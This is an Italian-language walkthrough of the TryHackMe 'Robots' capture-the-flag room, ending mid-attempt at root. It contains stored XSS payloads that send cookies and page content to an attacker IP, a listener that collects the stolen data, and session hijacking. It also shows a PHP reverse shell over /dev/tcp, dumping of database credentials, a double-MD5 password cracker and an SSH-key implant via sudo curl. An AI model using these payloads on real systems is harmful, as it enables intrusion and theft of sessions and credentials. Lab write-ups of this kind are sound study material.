
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/robots


facciamo una scansione 
```
nmap -Pn -O -v -p- 10.10.234.165
```
```
22/tcp   open  ssh
80/tcp   open  http
9000/tcp open  cslistener

```
cerchiamo il file robots se presente sul sito
```
http://10.10.234.165/robots.txt
```

```
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
```
```
Apache/2.4.61
```
proviamo a vedere se ci sono altre directory
```
gobuster dir -u http://10.10.234.165:80 -w /usr/share/wordlists/dirb/common.txt -t50
```

```
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/harm                 (Status: 301) [Size: 313] [--> http://10.10.234.165/harm/]
/harming              (Status: 301) [Size: 316] [--> http://10.10.234.165/harming/]
/ignoring             (Status: 301) [Size: 317] [--> http://10.10.234.165/ignoring/]
/robots.txt           (Status: 200) [Size: 82]
/server-status        (Status: 403) [Size: 278]

```
controlliamo cosa c'è sulla porta 9000
```
http://10.10.234.165:9000/
```

```
gobuster dir -u http://10.10.234.165:9000 -w /usr/share/wordlists/dirb/common.txt -t50
```

```
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10671]
/server-status        (Status: 403) [Size: 280]
```

```
nmap -p 80 --script http-enum 10.10.234.165
```
cerchiamo delle vulnerabilità

https://github.com/TAM-K592/CVE-2024-40725-CVE-2024-40898

```
python3 CVE-2024-40725.py -u http://10.10.197.155/
```

```
python3 'CVE-2024-40898 .py' -u 10.10.197.155:9000
```
vulnerabilità non sono utili
```
nano /etc/hosts
```

```
10.10.197.155   robots.thm
```
ci colleghiamo alla pagina di registrazione
```
http://robots.thm/harm/to/self/
```

```
#### Register here

An admin monitors new users. Your initial password will be **md5(username+ddmm)**

username 

date of birth
```
dati di registrazione nuovo utente
```
dama
01/01/2001
```

```
echo -n "dama0101" | md5sum
```

```
1e5508670c36f30bf0488a30825e6f84
```
password iniziale

ci logghiamo!

```
#### Last logins

[Logout](http://robots.thm/harm/to/self/logout.php)

Admin last login: 2025-03-15 14:39

|User 3 - dama last logins|
|---|
|2025-03-15 15:32|
```
vediamo che cosa c'è in server info
```
http://robots.thm/harm/to/self/server_info.php
```
troviamo molte cose utili in seguito
```
-# PHP Version 8.3.10
```

proviamo ad attaccare la password dell'Admin
```
#!/bin/bash

-# Nome del file di output
output_file="md5_hashes.txt"

-# Pulisci il file di output se esiste già
> "$output_file"

# Funzione per generare le combinazioni e calcolare l'MD5
genera_combinazioni() {
    for mese in {1..12}; do
        case $mese in
            1|3|5|7|8|10|12) giorni=31 ;;  # Mesi con 31 giorni
            4|6|9|11) giorni=30 ;;         # Mesi con 30 giorni
            2) giorni=29 ;;                # Febbraio
        esac
        
        for giorno in $(seq -w 1 $giorni); do
            mese_formattato=$(printf "%02d" "$mese")  # Formatta il mese con due cifre
            combinazione="admin${giorno}${mese_formattato}"
            md5=$(echo -n "$combinazione" | md5sum | awk '{print $1}')  # Calcola l'MD5
            echo "$md5" >> "$output_file"  # Salva l'MD5 nel file di output
        done
    done
}

# Chiamata alla funzione
genera_combinazioni

echo "MD5 hashes salvati in $output_file"

```

Intercettiamo richiesta login con burp suite

```
hydra -s 80 -l dama -P md5_hashes.txt 10.10.109.79 http-post-form '/harm/to/self/login.php:j_username=dama&password=^PASS^&login=Submit+Query:Your page title here'
```



Proviamo a sfruttare XSS per  javascript creiamo una registrazione di un user
username
```
<script>alert('Succ3ssful XSS');</script>
```
data nascita
```
01/01/2001
```
```
echo -n "<script>alert('Succ3ssful XSS');</script>0101" | md5sum
```
password
```
a06f2d2086a4eff773649e68a91a1285
```
ci logghiamo e vediamo che è realmente vulnerabile a XSS!

user Rubare cookies:
```
<script>alert(document.cookie);</script>
```
```
echo -n "<script>alert(document.cookie);</script>0101" | md5sum
```
```
dba8b868800d9ae3cbb1385dd536fc2f
```
purteoppo HttpOnly è abilitato quindi non otteniamo i cookie di sessione dell'admin

```
<script>fetch('http://10.14.99.134:2222/steal?cookie=' + encodeURIComponent(document.cookie));</script>
```
```
echo -n "<script>fetch('http://10.14.99.134:2222/steal?cookie=' + encodeURIComponent(document.cookie));</script>0101" | md5sum
```
```
6790fb34478fc12844824f83ce1313cc
```

```
<script>new WebSocket('ws://10.14.99.134:2222').onopen=function(){this.send('whoami');};</script>
```
```
echo -n "<script>new WebSocket('ws://10.14.99.134:2222').onopen=function(){this.send('whoami');};</script>0101" | md5sum
```
```
a17e844ed06fe2df1db3b6226c6fb9c0
```


```
<script>fetch('http://10.14.99.134:2222/shell', {method: 'POST', body: 'cmd=' + encodeURIComponent('whoami'), headers: {'Content-Type': 'application/x-www-form-urlencoded'}});</script>
```

```
echo -n "<script>fetch('http://10.14.99.134:2222/shell', {method: 'POST', body: 'cmd=' + encodeURIComponent('whoami'), headers: {'Content-Type': 'application/x-www-form-urlencoded'}});</script>0101" | md5sum
```

```
f86a1009f6f3908e2fa27dff0ffaff8f
```

proviamo ad ottenere una pagina 
```
<script>new Image().src="http://10.14.99.134:4444/?data="+btoa(document.body.innerHTML);</script>
```
data
```
01012001
```
```
echo -n "<script>new Image().src="http://10.14.99.134:4444/?data="+btoa(document.body.innerHTML);</script>0101" | md5sum
```
```
21a025892598cc13a45e3e656e917eff
```
```
python3 -m http.server 4444
```

```
echo "CjxkaXY+PGEgaHJlZj0ic2VydmVyX2luZm8ucGhwIj5TZXJ2ZXIgaW5mbzwvYT48L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPjxkaXYgY2xhc3M9InJvdyI+PGRpdiBjbGFzcz0ib25lLWhhbGYgY29sdW1uIiBzdHlsZT0ibWFyZ2luLXRvcDogMjUlIj48ZGl2PjxoND5MYXN0IGxvZ2luczwvaDQ+PC9kaXY+PGRpdj48YSBocmVmPSJsb2dvdXQucGhwIj5Mb2dvdXQ8L2E+PC9kaXY+Cjx0YWJsZSBjbGFzcz0idS1mdWxsLXdpZHRoIj4KPHRoZWFkPjx0cj48dGg+VXNlciAxIC0gYWRtaW4gbGFzdCBsb2dpbnM8L3RoPjwvdHI+PC90aGVhZD48dGJvZHk+Cjx0cj48dGQ+MjAyNS0wMy0xOCAxMTo1MzwvdGQ+PC90cj4KPC90Ym9keT48L3RhYmxlPgo8dGFibGUgY2xhc3M9InUtZnVsbC13aWR0aCI+Cjx0aGVhZD48dHI+PHRoPlVzZXIgMyAtIDxzY3JpcHQ+bmV3IEltYWdlKCkuc3JjPSJodHRwOi8vMTAuNC42MS4yNTE6NDQ0NC8/ZGF0YT0iK2J0b2EoZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpOzwvc2NyaXB0PiBsYXN0IGxvZ2luczwvdGg+PC90cj48L3RoZWFkPjx0Ym9keT4KPC90Ym9keT48L3RhYmxlPgo8dGFibGUgY2xhc3M9InUtZnVsbC13aWR0aCI+Cjx0aGVhZD48dHI+PHRoPlVzZXIgNSAtIDxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuY29va2llKTs8L3NjcmlwdD4gbGFzdCBsb2dpbnM8L3RoPjwvdHI+PC90aGVhZD48dGJvZHk+Cjx0cj48dGQ+MjAyNS0wMy0xOCAxMjowMzwvdGQ+PC90cj4KPHRyPjx0ZD4yMDI1LTAzLTE4IDEyOjAyPC90ZD48L3RyPgo8L3Rib2R5PjwvdGFibGU+Cjx0YWJsZSBjbGFzcz0idS1mdWxsLXdpZHRoIj4KPHRoZWFkPjx0cj48dGg+VXNlciA3IC0gPHNjcmlwdD5uZXcgSW1hZ2UoKS5zcmM9Imh0dHA6Ly8xMC4xNC45OS4xMzQ6NDQ0NC8/ZGF0YT0iK2J0b2EoZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpOzwvc2NyaXB0PjwvdGg+PC90cj48L3RoZWFkPjwvdGFibGU+PC9kaXY+PC9kaXY+PC9kaXY+" | base64 --decode
```

decodificato base64
```
<div><a href="server_info.php">Server info</a></div>

div class="container"><div class="row"><div class="one-half column" style="margin-top: 25%"><div><h4>Last logins</h4></div><div><a href="logout.php">Logout</a></div>
<table class="u-full-width">
<thead><tr><th>User 1 - admin last logins</th></tr></thead><tbody>
<tr><td>2025-03-18 11:53</td></tr>
</tbody></table>
<table class="u-full-width">
<thead><tr><th>User 3 - <script>new Image().src="http://10.4.61.251:4444/?data="+btoa(document.body.innerHTML);</script> last logins</th></tr></thead><tbody>
</tbody></table>
<table class="u-full-width">
<thead><tr><th>User 5 - <script>alert(document.cookie);</script> last logins</th></tr></thead><tbody>
<tr><td>2025-03-18 12:03</td></tr>
<tr><td>2025-03-18 12:02</td></tr>
</tbody></table>
<table class="u-full-width">
<thead><tr><th>User 7 - <script>new Image().src="http://10.14.99.134:4444/?data="+btoa(document.body.innerHTML);</script></th></tr></thead></table></div></div></div> 
```
otteniamo nomi user e che la pagina è probabilmente della sessione dell'amministratore!

Poiché sappiamo che il nostro payload XSS viene eseguito nella **sessione dell'amministratore** , possiamo fargli visitare **server_info.php** sul proprio browser. Ciò significa che otterremo una nuova pagina **phpinfo()** dalla prospettiva dell'amministratore. E se siamo fortunati, potremmo trovare qualcosa d'interessante', come il **PHPSESSID** nella sezione `$_COOKIE`or `HTTP_COOKIE`.

```
<script>  
fetch('/harm/to/self/server_info.php')  
.then(response => response.text())  
.then(data => {  
fetch('http://10.14.99.134:5555/log.php', {  
method: 'POST',  
headers: { 'Content-Type': 'application/x-www-form-urlencoded' },  
body: 'output=' + encodeURIComponent(btoa(data))  
});  
});  
</script>
```

- Lo script esegue la richiesta **del browser dell'amministratore**`server_info.php` , recuperando la **pagina phpinfo()** con i dettagli della sessione.
- Quindi **codifica** la risposta in Base64 ( `btoa(data)`) per garantire una trasmissione sicura.
- Infine, **invia i dati codificati** al server dell'attaccante ( `10.4.61.251:5555/log.php`) affinché io possa analizzarli.

Per catturare i dati rubati, ho creato un file **log.php** sul server attaccante

```
nano index.php
```
```
<?php  
if ($_SERVER["REQUEST_METHOD"] === "POST") {  
$data = isset($_POST["output"]) ? $_POST["output"] : "No data received";  
  
// Simpan ke file log  
file_put_contents("log.txt", base64_decode($data) . "\n", FILE_APPEND | LOCK_EX);  
  
echo "Data received!";  
} else {  
echo "Invalid request method.";  
}  
?>
```

**Poiché il modulo** **Python** normale non riesce a gestire **le richieste POST** (o almeno non facilmente senza modifiche), ho deciso di usare **Flask** . Ho creato un semplice server Flask per gestire i dati in arrivo e registrarli:`**http.server**`

```
nano serverflask.py
```
```
from flask import Flask, request

app = Flask(__name__)

@app.route('/log.php', methods=['POST'])
def log_data():
    data = request.form.get("output", "No data received")  # Assicurati che questa riga sia indentata
    with open("log.txt", "a") as f:
        f.write(data + "\n")  # Questa riga deve essere indentata anche
    return "Data received!", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5555)

```

```
python serverflask.py
```

Ho controllato `log.txt`ed eccola lì: una **risposta codificata in Base64** .

Dopo la decodifica, abbiamo ottenuto l' **output della pagina phpinfo()** e abbiamo cercato **PHPSESSID**

```
cat log.txt | base64 --decode
```

```
cat log.txt | base64 --decode | grep PHPSESSID
```
```
<tr><td class="e">HTTP_COOKIE </td><td class="v">PHPSESSID=stf27h4pll3ceso7p1cldj0tq7 </td></tr>
<tr><td class="e">Cookie </td><td class="v">PHPSESSID=stf27h4pll3ceso7p1cldj0tq7 </td></tr>
<tr><td class="e">session.name</td><td class="v">PHPSESSID</td><td class="v">PHPSESSID</td></tr>
<tr><td class="e">$_COOKIE['PHPSESSID']</td><td class="v">stf27h4pll3ceso7p1cldj0tq7</td></tr>
<tr><td class="e">$_SERVER['HTTP_COOKIE']</td><td class="v">PHPSESSID=stf27h4pll3ceso7p1cldj0tq7</td></tr>
<tr><td class="e">HTTP_COOKIE </td><td class="v">PHPSESSID=stf27h4pll3ceso7p1cldj0tq7 </td></tr>
<tr><td class="e">Cookie </td><td class="v">PHPSESSID=stf27h4pll3ceso7p1cldj0tq7 </td></tr>
<tr><td class="e">session.name</td><td class="v">PHPSESSID</td><td class="v">PHPSESSID</td></tr>
<tr><td class="e">$_COOKIE['PHPSESSID']</td><td class="v">stf27h4pll3ceso7p1cldj0tq7</td></tr>
<tr><td class="e">$_SERVER['HTTP_COOKIE']</td><td class="v">PHPSESSID=stf27h4pll3ceso7p1cldj0tq7</td></tr>
```

Ho sostituito il mio **PHPSESSID** con quello rubato utilizzando **DevTools** , ho aggiornato la pagina e voilà: **siamo nel pannello di amministrazione!**

```
stf27h4pll3ceso7p1cldj0tq7
```
enumeriamo directory
```
gobuster dir -u http://10.10.181.89:80/harm/to/self/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -c "PHPSESSID=stf27h4pll3ceso7p1cldj0tq7"
```

```
dirb http://10.10.181.89:80/harm/to/self/ /usr/share/wordlists/dirb/common.txt -H "Cookie: PHPSESSID=stf27h4pll3ceso7p1cldj0tq7"
```

```
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -d "id=FUZZ&catalogue=1" -u http://10.10.181.89:80/harm/to/self -H "Cookie: PHPSESSID=stf27h4pll3ceso7p1cldj0tq7"
```


troviamo
```
http://robots.thm/harm/to/self/admin.php
```

potrebbe trattarsi di trattarsi di **SSRF**

Quindi, ho creato il seguente payload per ottenere **l'esecuzione di codice remoto (RCE)** :

```
nano rce.php
```
```
<?php system("bash -c 'bash -i >& /dev/tcp/10.14.99.134/6666 0>&1'"); ?>
```
creiamo un server sulla porta 6667
```
python3 -m http.server 6667
```
mettiamoci in ascolto su di un'altra finestra del terminale
```
nc -lvnp 6666
```
da http://robots.thm/harm/to/self/admin.php eseguiamo
```
http://10.14.99.134:6667/rce.php
```

otteniamo cosi una reverse shell!
```
ls
```
```
www-data@robots:/var/www/html/harm/to/self$ ls
ls
admin.php
config.php
css
index.php
login.php
logout.php
register.php
server_info.php

```

vediamo cosa c'è in config.php

```
cat config.php
```
```
cat config.php
<?php
    $servername = "db";
    $username = "robots";
    $password = "q4qCz1OflKvKwK4S";
    $dbname = "web";
// Get the current hostname
$currentHostname = $_SERVER['HTTP_HOST'];

// Define the desired hostname
$desiredHostname = 'robots.thm';

// Check if the current hostname does not match the desired hostname
if ($currentHostname !== $desiredHostname) {
    // Redirect to the desired hostname
    header("Location: http://$desiredHostname" . $_SERVER['REQUEST_URI']);
    exit();
}
ini_set('session.cookie_httponly', 1);

session_start();

?>

```

abbiamo trovato
- **Nome del server:** `db`
- **Nome utente: robot**
- **Password: q4qCz1OflKvKwK4S**

possiamo usare `getent`per controllare IP del server che se ricordo bene era già presente nell info server
```
getent hosts db
```

```
172.18.0.2      db
```

Poiché ci troviamo in un **ambiente Docker** , MySQL non era installato, quindi non ho potuto connettermi direttamente tramite il `mysql`comando.

Poi ho pensato: **come fa l'applicazione a memorizzare le credenziali utente?** Forse `register.php`può darci un indizio.

Ho `**cat register.php**`scoperto che l'app utilizza **PDO (PHP Data Objects)** per le interazioni con il database!

Poi ho creato questo payload e l'ho memorizzato in `**/tmp**`modo da poterlo eseguire. Ho anche verificato se PHP era installato, e lo era.

Questo payload elenca tutte le tabelle nel database **web** :

```
echo "<?php  
try {  
\ $conn = new PDO ( 'mysql:host=172.18.0.2;dbname=web' , 'robots' , 'q4qCz1OflKvKwK4S' );  
\ $conn -> setAttribute (PDO:: ATTR_ERRMODE , PDO:: ERRMODE_EXCEPTION );  
  
// Visualizza tutte le tabelle nel database 'web'  
\ $result = \ $conn -> query ( 'SHOW TABLES' );  
echo \ "Tabelle nel web:\\n\";  
while (\$row = \$result->fetch(PDO::FETCH_NUM)) {  
echo \"- \" . \$row[0] . \"\\n\";  
}  
} catch (PDOException \$e) {  
echo 'Connessione fallita: ' . \$e->getMessage();  
}  
?>" > /tmp/pload.php
```

```
echo "<?php try { \$conn = new PDO('mysql:host=172.18.0.2;dbname=web', 'robots', 'q4qCz1OflKvKwK4S'); \$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \$result = \$conn->query('SHOW TABLES'); echo 'Tabelle nel web:' . PHP_EOL; while (\$row = \$result->fetch(PDO::FETCH_NUM)) { echo '- ' . \$row[0] . PHP_EOL; } } catch (PDOException \$e) { echo 'Connessione fallita: ' . \$e->getMessage(); } ?>" > /tmp/pload.php
```

eseguiamolo con
```
php /tmp/pload.php
```

```
Tabelle nel web:
- logins
- users
```


Infine, ho creato questo payload per scaricare tutti i dati dalla `users`tabella:

```
echo "<?php  
try {  
\ $conn = new PDO( 'mysql:host=172.18.0.2;dbname=web' , 'robots' , 'q4qCz1OflKvKwK4S' );  
\ $conn ->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  
  
// Visualizza tutti i dati della tabella users  
\ $result = \ $conn ->query( 'SELECT * FROM users' );  
  
echo \"\\n=== Tabella Users ===\\n\";  
while (\ $row = \ $result ->fetch(PDO::FETCH_ASSOC)) {  
echo \"ID: {\ $row [ 'id' ]}\\nNome utente: {\ $row [ 'username' ]}\\nPassword: {\ $row [ 'password' ]}\\nGruppo: {\ $row [ 'group' ]}\\n\\n\";  
}  
} catch (PDOException \ $e ) {  
echo 'Connessione fallita: ' . \ $e ->getMessage();  
}  
?>" > /tmp/ploadus.php
```

```
php /tmp/ploadus.php
```

```
=== Tabella Users ===
ID: 1
Nome utente: admin
Password: 3e3d6c2d540d49b1a11cf74ac5a37233
Gruppo: admin

ID: 2
Nome utente: rgiskard
Password: dfb35334bf2a1338fa40e5fbb4ae4753
Gruppo: nologin

ID: 3
Nome utente: <script>new Image().src="http://10.4.61.251:4444/?data="+btoa(document.body.innerHTML);</script>
Password: 4ec1c970e4c2e9237e14c0ebca64eb9f
Gruppo: guest

ID: 5
Nome utente: <script>alert(document.cookie);</script>
Password: 97bc4722f03d46f56c882f95b63ea8cc
Gruppo: guest

ID: 7
Nome utente: <script>new Image().src="http://10.14.99.134:4444/?data="+btoa(document.body.innerHTML);</script>
Password: 00cbd880aceeff24bd291a9c3d2eb314
Gruppo: guest

ID: 8
Nome utente: <script>   fetch('/harm/to/self/server_info.php')   .then(response => response.text())   .then(data => {   fetch('http://10.14.99.134:5555/log.php', {   method: 'POST',   headers: { 'Content-Type': 'application/x-www-form-urlencoded' },   body: 'output=' + encodeURIComponent(btoa(data))   });   });   </script>
Password: 2e604e858056646991a0422c9648f420
Gruppo: guest

ID: 9
Nome utente: <script>   fetch('/harm/to/self/server_info.php')   .then(response => response.text())   .then(data => {   fetch('http://10.14.99.134:5555/log.php', {   method: 'POST',   headers: { 'Content-Type': 'application/x-www-form-urlencoded' },   body: 'output=' + encodeURIComponent(btoa(data))   });   });    </script>
Password: b4578803593f66d71e3c99291809a301
Gruppo: guest

```

Ma ho notato qualcosa di strano. Ho provato a generare un hash **MD5** per uno degli utenti usando il formato **md5(username + ddmm)** (come accennato in precedenza). Tuttavia, quando l'ho confrontato con la password scaricata, **non corrispondeva** !

o capito che la password è **doppiamente hash** ! Invece di solo `md5(username + ddmm)`, l'output di quell'hash è **nuovamente** hash , rendendolo:

```
md5 (md5(nome utente + ggmm))
```

Quindi, per concludere, con l'aiuto di ChatGPT, abbiamo creato uno script Python per **replicare il processo di doppio hash** e abbinare la password scaricata **da rgiskard** .

```
nano doppioh.py
```

```
import hashlib

def md5_hash(text):
    return hashlib.md5(text.encode()).hexdigest()

def generate_passwords(username):
    for day in range(1, 32):
        for month in range(1, 13):
            password = f"{username}{day:02}{month:02}"
            first_hash = md5_hash(password)
            second_hash = md5_hash(first_hash)
            yield password, second_hash

def crack_hash(target_hash, username):
    for password, hashed in generate_passwords(username):
        if hashed == target_hash:
            print(f"[+] Password trovata: {password}")
            return password
    print("[-] Gagli di trovare la password")
    return None

if __name__ == "__main__":
    username = "rgiskard"
    target_hash = "dfb35334bf2a1338fa40e5fbb4ae4753"
    crack_hash(target_hash, username)
```

Eseguitelo e otterremo il (nome utente+mm) di questo tizio rgiskard!
```
nano doppioh.py
```
```
Password trovata: rgiskard2209
```
Ora, per generare la **password reale** , richiamiamo la regola dalla pagina di registro:
Poiché abbiamo già capito che la password scaricata era **sottoposta a doppio hash** , ora dobbiamo solo **generare il primo hash MD5** di:

rgiskard + ggmm

```
echo -n "rgiskard2209" | md5sum
```
```
b246f21ff68cae9503ed6d18edd32dae
```
Dopo l'hashing `"rgiskard2209"`(con il formato data corretto), abbiamo ottenuto con successo **la vera password di rgiskard** ! È il momento di effettuare il login e vedere cosa succederà

```
ssh rgiskard@robots.thm
```

```
b246f21ff68cae9503ed6d18edd32dae
```

vediamo la scalata dei privilegi
```
sudo -l
```
```
[sudo] password for rgiskard: 
Matching Defaults entries for rgiskard on ubuntu-jammy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rgiskard may run the following commands on ubuntu-jammy:
    (dolivaw) /usr/bin/curl 127.0.0.1/*

```

- `sudo -u dolivaw`→ Ciò significa che `rgiskard`è possibile eseguire comandi come `dolivaw`.
- `/usr/bin/curl`→ Il comando consentito è `curl`, che viene utilizzato per effettuare richieste HTTP.
- `127.0.0.1/*`→ Ciò significa che possiamo accedere `curl` **a QUALSIASI** endpoint sulla macchina locale.


```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/*
```

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.61 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>

```
Per verificare la presenza di potenziale **LFI** , ho provato a leggere `/etc/passwd`usando lo `file://`schema. Il comando ha restituito il contenuto di /etc/passwd, confermando l'LFI tramite SSRF.
```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///../../etc/passwd
```

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.61 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
rgiskard:x:1002:1002::/home/rgiskard:/bin/bash
dolivaw:x:1003:1003::/home/dolivaw:/bin/bash

```
Poiché i flag sono spesso memorizzati in `user.txt`, ho eseguito il seguente comando e abbiamo ottenuto il primo flag!
```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///home/dolivaw/user.txt
```
```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.61 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
THM{9b17d3c3e86c944c868c57b5a7fa07d8}
```

```
THM{9b17d3c3e86c944c868c57b5a7fa07d8}
```

Ho provato a **scaricare** uno script sul computer di destinazione utilizzando `curl`.

Dopo aver eseguito il comando, ho ricevuto una risposta che confermava che il file era stato recuperato correttamente.
```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://10.14.99.134:8080/linpeas.sh
```

Poi ho provato a guardare dentro la directory home di Dolivaw accedendo a `file:///../home/dolivaw/.ssh/`, ma non è stato restituito nulla. Tuttavia, in base al corpo della risposta, che non conteneva "file/directory not found", ho potuto confermare che la directory esiste.

Grazie a questo, possiamo inserire la nostra `id_rsa.pub`chiave nel file di Dolivaw `.ssh/authorized_keys`, potendo così accedere all'account in remoto dal nostro computer utilizzando la nostra chiave privata.

```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///../home/dolivar/.ssh/
```

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.61 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
curl: (37) Couldn't open file /home/dolivar/.ssh/

```

Ma prima dobbiamo generare una coppia di chiavi SSH utilizzando il seguente comando:

```
ssh-keygen -t rsa
```

```
ssh-keygen -t rsa                                                                            
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): id_rsa
Enter passphrase for "id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:X5SS0xm/ZUqJyHSZC2FB4cc16xYXIqYNhPXmGsNmvRI root@kali
The key's randomart image is:
+---[RSA 3072]----+
|        +=B*o+o. |
|       . =B*+B.+.|
|         .B=O.* +|
|        . +=.o B |
|        SE o. =  |
|        o.=...   |
|         o..     |
|          .      |
|                 |
+----[SHA256]-----+

```

```
python3 -m http.server 8080
```

Poi ho provato a scaricare il tuo `id_rsa.pub`file dal tuo server web ( `http://10.14.99.134:8080/id_rsa.pub`) e a scriverlo su`/home/dolivaw/.ssh/authorized_keys.`
da rgiskard
```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://10.14.99.134:8080/id_rsa.pub -o id_rsa.pub -o /home/dolivaw/.ssh/authorized_keys
```

Dopodiché, ho ricontrollato se il mio `id_rsa.pub`era stato aggiunto correttamente andando su "file:///home/dolivaw/.ssh/authorized_keys". Dopo aver controllato, ho confermato che la mia chiave pubblica era effettivamente presente nel `authorized_keys`file, il che significa che ora potevo autenticarmi `dolivaw`utilizzando la mia chiave privata!

```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/* file:///home/dolivar/.ssh/authorized_keys
```

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.61 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
curl: (37) Couldn't open file /home/dolivar/.ssh/authorized_keys

```

```
Sulla mia macchina, ho usato SSH per connettermi `dolivaw@robots.thm`usando la mia chiave privata. L'autenticazione è riuscita e ho ottenuto l'accesso all'utente `dolivaw`!
```

```
sudo ssh dolivaw@robots.thm -i id_rsa
```
```
dolivaw@ubuntu-jammy:~$ whoami
dolivaw
```

==Escalation dei privilegi di root==

```
sudo -l
```

```
(ALL) NOPASSWD: /usr/sbin/apache2
```

Ciò significa che c'è una potenziale opportunità di escalation dei privilegi (privesc) usando Apache2. Poiché Apache2 è un servizio che può essere manipolato per eseguire comandi come root, possiamo tentare di sfruttare questa autorizzazione per ottenere l'accesso root.

Sulla base di [GTFOBins](https://gtfobins.github.io/gtfobins/apache2ctl/) , possiamo sfruttare il permesso sudo di Apache2 leggendo file arbitrari come root utilizzando il seguente comando:

```
dolivaw@ubuntu-jammy:~$ LFILE=/root/root.txt
dolivaw@ubuntu-jammy:~$ sudo apache2 -c "Include $LFILE" -k stop
[Tue Mar 18 18:19:13.716974 2025] [core:warn] [pid 2412] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
dolivaw@ubuntu-jammy:~$ 

```
non funziona!

```
sudo -u root /usr/sbin/apache2 -C "Define APACHE_RUN_DIR /tmp" -C "Include $LFILE" -k stop
```

```
